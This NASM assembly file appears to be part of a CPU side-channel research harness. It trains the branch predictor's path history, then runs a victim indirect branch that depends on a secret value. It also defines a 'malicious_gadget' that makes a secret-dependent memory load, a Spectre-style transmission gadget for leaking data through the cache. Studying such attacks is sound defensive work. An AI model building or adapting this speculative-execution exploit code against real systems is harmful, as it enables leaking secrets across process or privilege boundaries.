%include "./SET_VICTIM_PHR0.nasm"
%include "./SET_VICTIM_PHR1.nasm"

%define nthreads 1
%define repeat0  repeat0_input
%define repeat1  1000
%define repeat2  1
%define noptype  2

%macro testinitc 0  ; initialization
    mov dword[PrintCustomPMC], 1
%endmacro

%macro testinit3 0
    rdrand rdx
    and rdx, 1
    mov qword[UserData], rdx
    mfence
    lea rbx, [UserData]
    mov rax, sec_victim_ibranch_addr
    call rax
%endmacro

%macro testcode 0   ; main test

    READ_PMC_START
    %assign i 0
    %rep 12
        align 1<<15
        %rep pc_14to12<<12
         nop
        %endrep
        %rep pc_11to5<<5
         nop
        %endrep
        jmp target_%+ i
        %rep 32
         nop
        %endrep
        target_%+ i:
        %rep 32
         nop
        %endrep
        SERIALIZE
    %assign i i+1
    %endrep
    READ_PMC_END

    %rep 512
     nop
    %endrep

%endmacro

%macro SHIFT_PHR 2  ; the macro code to left-shift the phr
    mov rax, %1
    jmp shift_phr%+ %2
    align 1<<16
    %rep (1<<16)-64
     nop
    %endrep
    shift_phr%+ %2:
    %rep 64-8
     nop
    %endrep
    dec rax
    cmp rax, 0
    jg shift_phr%+ %2
%endmacro

SECTION .sec_victim_ibranch exec
victim_ibranch:
    mov rdx, qword[rbx]
    lea r10, [victim_target_0]
    lea r9, [victim_target_1]
    cmp rdx, 1
    cmovz r10, r9
    mov qword[rbx+8], r10
    clflush [rbx+8]
    mfence
    
    cmp rdx, 1
    je victim_set_PHR1_start
    SHIFT_PHR 195,0
    %rep 23
     nop
    %endrep
    SET_VICTIM_PHR0 0

victim_set_PHR1_start:
    SHIFT_PHR 195,1
    %rep 23
     nop
    %endrep
    SET_VICTIM_PHR1 0
victim_set_PHR1_end:
    
    %rep victim_pc_14to12<<12
     nop
    %endrep
    
    %rep (50)<<6
     nop
    %endrep
    jmp [rbx+8]
    %rep 64
     nop
    %endrep
victim_target_0:
    %rep 64
     nop
    %endrep
    ret
victim_target_1:
    %rep 64
     nop
    %endrep
    ret
    %rep 33
     nop
    %endrep
malicious_gadget: ; a malicious gadget will never be reached in the correct control flow
    mov rax, secret
    shl rax, 9
    lea rcx, [rbx+2048]
    add rcx, rax
    mov rax, [rcx] ; a secret-dependent load
    %rep 64
     nop
    %endrep
    ret